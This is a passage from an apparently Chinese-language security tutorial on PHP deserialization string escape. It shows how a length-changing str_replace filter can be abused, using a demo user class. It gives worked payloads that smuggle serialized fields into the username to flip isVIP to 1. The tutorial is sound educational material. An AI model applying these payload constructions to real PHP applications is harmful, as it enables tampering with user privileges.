invoke__&#34;&gt;var_dump&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a_seri_filter_unseri&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//result：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;object&lt;/span&gt;(user)&lt;span class=&#34;comment&#34;&gt;#1 (3) &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [&lt;span class=&#34;string&#34;&gt;&amp;quot;username&amp;quot;&lt;/span&gt;]=&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;string&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;282&lt;/span&gt;) &lt;span class=&#34;string&#34;&gt;&amp;quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [&lt;span class=&#34;string&#34;&gt;&amp;quot;password&amp;quot;&lt;/span&gt;]=&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;string&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;) &lt;span class=&#34;string&#34;&gt;&amp;quot;123456&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [&lt;span class=&#34;string&#34;&gt;&amp;quot;isVIP&amp;quot;&lt;/span&gt;]=&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;int&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;那么，灵魂拷问，上面的 username 和 password 都是可控参数，那么我能能不能控制 password 字段？&lt;/p&gt;
&lt;p&gt;在这个例子中是不可以的，因为我们不能对用户的密码做替换，但是如果这个字段不是 password，是 nickname 这样的会被过滤的，那么我们的 payload 也可以写在 nickname 中&lt;/p&gt;
&lt;p&gt;最后，我们总结一下，想要通过过滤后字符串变多来实现对象逃逸，我们需要哪些步骤&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1. 分析他过滤了那个参数，那个参数是我们可控的&lt;/p&gt;
&lt;p&gt;​	上述例子中 username，password 是可控的，但只对 username 进行了过滤，因此我们的对象逃逸就会出现在 username 中&lt;/p&gt;
&lt;p&gt;2. 构造我们的 payload，即我们想要覆盖哪个变量&lt;/p&gt;
&lt;p&gt;​	上述例子中，我们想要将 isVIP 变为 1，因此我们构造的 payload 为：  &lt;code&gt;&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:6:&amp;quot;123456&amp;quot;;s:5:&amp;quot;isVIP&amp;quot;;i:1;&amp;#125;&lt;/code&gt; ，并且需要计算长度，为了我们之后的覆盖做准备&lt;/p&gt;
&lt;p&gt;3. 分析它的过滤函数，得到每次过滤我们可以逃逸出的字符数量，与我们的 (2) 中 payload 相比，凑够（2）中字符的数量&lt;/p&gt;
&lt;p&gt;​	上述例子中，我们从 admin 变为 hacker，每次过滤字符多一个，因此我们要逃逸 47 个字符，我们就需要重复 47 遍 admin&lt;/p&gt;
&lt;p&gt;4. 将我们构造的 payload 放到程序中，得到完整的 payload：&lt;/p&gt;
&lt;p&gt;​	上述例子中，我们构造的 payload 是：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:6:&amp;quot;123456&amp;quot;;s:5:&amp;quot;isVIP&amp;quot;;i:1;&amp;#125;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;通过程序：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$a = new user(&#39;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:6:&amp;quot;123456&amp;quot;;s:5:&amp;quot;isVIP&amp;quot;;i:1;&amp;#125;&#39;,&#39;123456&#39;);&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;生成我们最终的 payload：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;O:4:&amp;quot;user&amp;quot;:3:&amp;#123;s:8:&amp;quot;username&amp;quot;;s:282:&amp;quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:6:&amp;quot;123456&amp;quot;;s:5:&amp;quot;isVIP&amp;quot;;i:1;&amp;#125;&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:6:&amp;quot;123456&amp;quot;;s:5:&amp;quot;isVIP&amp;quot;;i:0;&amp;#125;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;5.unserialize 进行验证&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h5 id=&#34;过滤后字符变少&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过滤后字符变少&#34;&gt;#&lt;/a&gt; 过滤后字符变少&lt;/h5&gt;
&lt;p&gt;同样的过滤，这次将 admin 变为 hack&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;user&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$username&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$password&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$isVIP&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$u&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$p&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;username = &lt;span class=&#34;variable&#34;&gt;$u&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;password = &lt;span class=&#34;variable&#34;&gt;$p&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;isVIP = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;filter&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$s&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;str_replace&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;admin&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;hack&amp;quot;&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$s&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;user&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;admin&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;123456&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a_seri&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;serialize&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a_seri_filter&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;filter&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a_seri&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$a_seri_filter&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;result:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;O:&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;user&amp;quot;&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;:&amp;#123;s:&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;username&amp;quot;&lt;/span&gt;;s:&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;hack&amp;quot;&lt;/span&gt;;s:&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;password&amp;quot;&lt;/span&gt;;s:&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;123456&amp;quot;&lt;/span&gt;;s:&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;isVIP&amp;quot;&lt;/span&gt;;i:&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;同样，我们想把 isVIP 变为 1，比较一下&lt;strong&gt;现有子串&lt;/strong&gt;和&lt;strong&gt;目标子串&lt;/strong&gt;：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:6:&amp;quot;123456&amp;quot;;s:5:&amp;quot;isVIP&amp;quot;;i:0;&amp;#125;	//现有子串&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:6:&amp;quot;123456&amp;quot;;s:5:&amp;quot;isVIP&amp;quot;;i:1;&amp;#125;	//目标子串&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;因为过滤的时候，将&lt;strong&gt; 5&lt;/strong&gt; 个字符删减为了&lt;strong&gt; 4&lt;/strong&gt; 个，所以和上面字符变多的情况相反，随着加入的&lt;strong&gt; admin&lt;/strong&gt; 的数量增多，&lt;strong&gt;现有子串&lt;/strong&gt;后面会缩进来。&lt;/p&gt;
&lt;p&gt;计算一下&lt;strong&gt;目标子串&lt;/strong&gt;的长度：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:6:&amp;quot;123456&amp;quot;;s:5:&amp;quot;isVIP&amp;quot;;i:1;&amp;#125;	//目标子串&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//长度为47&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;再计算一下到&lt;strong&gt;下一个可控变量&lt;/strong&gt;的字符串长度：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:6:&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//长度为22&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;因为每次过滤的时候都会少&lt;strong&gt; 1&lt;/strong&gt; 个字符，因此我们先将&lt;strong&gt; admin&lt;/strong&gt; 字符重复&lt;strong&gt; 22&lt;/strong&gt; 遍，这里 22 遍是大概值，后续还需要调整&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$a = new user(&amp;#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&amp;#x27;,&amp;#x27;123456&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$a_seri = serialize($a);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$a_seri_filter = filter($a_seri);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo $a_seri_filter;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;O:4:&amp;quot;user&amp;quot;:3:&amp;#123;s:8:&amp;quot;username&amp;quot;;s:105:&amp;quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:6:&amp;quot;123456&amp;quot;;s:5:&amp;quot;isVIP&amp;quot;;i:0;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;** 注意：**PHP 反序列化的机制是，比如如果前面是规定了有 10 个字符，但是只读到了 9 个就到了双引号，这个时候 PHP 会把双引号当做第 10 个字符，也就是说不根据双引号判断一个字符串是否已经结束，而是根据前面规定的数量来读取字符串。&lt;/p&gt;
&lt;p&gt;105 个字符结束后，位置如下&lt;/p&gt;
&lt;p&gt;&lt;code&gt;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:6:&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;也就是我们覆盖了 &lt;code&gt;;s:8:&amp;quot;password&amp;quot;;s:6:&lt;/code&gt; ，接下来我们的 username 的值变会覆盖后续的字符串&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$a = new user(&amp;#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&amp;#x27;,&amp;#x27;&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:6:&amp;quot;123456&amp;quot;;s:5:&amp;quot;isVIP&amp;quot;;i:1;&amp;#125;&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$a_seri = serialize($a);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$a_seri_filter = filter($a_seri);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo $a_seri_filter;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;O:4:&amp;quot;user&amp;quot;:3:&amp;#123;s:8:&amp;quot;username&amp;quot;;s:105:&amp;quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:47:&amp;quot;&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:6:&amp;quot;123456&amp;quot;;s:5:&amp;quot;isVIP&amp;quot;;i:1;&amp;#125;&amp;quot;;s:5:&amp;quot;isVIP&amp;quot;;i:0;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;仔细观察这一串字符串可以我们希望覆盖的 107 个字符，但是前面只有显示 105&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:47:&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;解决办法是&lt;/strong&gt;：多添加&lt;strong&gt; 2&lt;/strong&gt; 个&lt;strong&gt; admin&lt;/strong&gt;，这样就可以补上缺少的字符。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$a = new user(&amp;#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&amp;#x27;,&amp;#x27;&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:6:&amp;quot;123456&amp;quot;;s:5:&amp;quot;isVIP&amp;quot;;i:1;&amp;#125;&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$a_seri = serialize($a);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$a_seri_filter = filter($a_seri);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo $a_seri_filter;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;O:4:&amp;quot;user&amp;quot;:3:&amp;#123;s:8:&amp;quot;username&amp;quot;;s:115:&amp;quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:47:&amp;quot;&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:6:&amp;quot;123456&amp;quot;;s:5:&amp;quot;isVIP&amp;quot;;i:1;&amp;#125;&amp;quot;;s:5:&amp;quot;isVIP&amp;quot;;i:0;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;115 个字符的覆盖范围 &lt;code&gt;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:47:&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;可以看到，这一下就对了。&lt;/p&gt;
&lt;p&gt;我们将对象反序列化然后输出，代码如下：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span 